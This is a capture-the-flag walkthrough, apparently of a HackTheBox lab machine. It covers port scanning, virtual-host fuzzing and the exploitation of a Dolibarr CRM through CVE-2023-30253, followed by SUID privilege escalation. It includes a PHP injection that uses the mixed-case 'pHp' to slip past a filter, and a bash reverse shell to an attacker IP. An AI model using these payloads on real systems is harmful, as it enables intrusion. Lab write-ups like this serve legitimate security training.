- I start with a scan of the open ports,
    
    ```bash
    nmap -p- --open --min-rate 5000 -Pn -sS 10.10.11.11 -oG scan
    ```

- Scanning open ports.
    
    ```bash
    nmap -p22,80 -sCV 10.10.11.11 -oN ports
    ```

- I look at what technologies they are using on the website. I found a path with this acknowledgement and added it to the `/etc/hosts` file
    
    ```bash
    whatweb http://10.10.11.11
    ```

- After searching for a while through the site and the routes discovered with gobuster I can't find anything relevant. When searching for virtual host I find one, `crm`
    
    ```bash
    wfuzz -c -t 200 --hh=15949 -w /usr/share/amass/wordlist/subdomains-top1mil-110000.txt -H "Host: FUZZ.board.htb" http://board.htb
    ```

- I add it to the /etc/hosts file and enter the site

- When looking for vulnerabilities of this version I find the CVE-2023-30253 that consists in creating a website and a page to which we can add php code. This has a validation that does not allow us to introduce the string “php” but when we put it in the following way if it allows us.
    
    [Security Advisory: Dolibarr 17.0.0 PHP Code Injection (CVE-2023-30253) - Swascan](https://www.swascan.com/security-advisory-dolibarr-17-0-0/)
    
- We add a piece of code to create a reverse shell and we enter to see the page that we have just created to execute our code.
    
    ```bash
    <?pHp
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.205/4242 0>&1'");
    ?>
    ```

- I start listening on port 4242 and I get a shell
    
    ```bash
    nc -nlvp 4242
    ```

- Searching for suid permissions I find some unusual files and running leanpeas confirms my suspicions. The enlightenment files with versions prior to 0.25.4 have a vulnerability listed in `CVE-2022-37706`.
    
    ```bash
    find / -perm -4000 2>/dev/null
    ```

- I find a POC of this CVE and by executing it I manage to escalate my privileges and become root
